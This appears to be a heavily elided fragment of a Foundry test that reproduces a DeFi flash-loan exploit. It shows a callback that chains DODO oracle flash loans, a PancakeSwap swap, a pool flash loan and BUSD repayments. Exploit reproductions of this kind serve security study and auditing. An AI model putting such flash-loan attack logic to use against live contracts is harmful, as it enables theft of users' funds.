...
contract ContractTest is Test {
    ...
    function DPPFlashLoanCall(
        ...
        if (msg.sender == address(DPPOracle_0x1b52)) {
            pancakeSwap.swap(0, 1000, address(this), data);
            BUSD.transfer(address(DPPOracle_0x1b52), 7001000000000000000);
        }

        if (msg.sender == address(DPPOracle_0x8191)) {
            pool.flash(address(this), 70000000000000000000000, 0, new bytes(1));
            BUSD.transfer(address(pancakeSwap), 59);
        }
    }
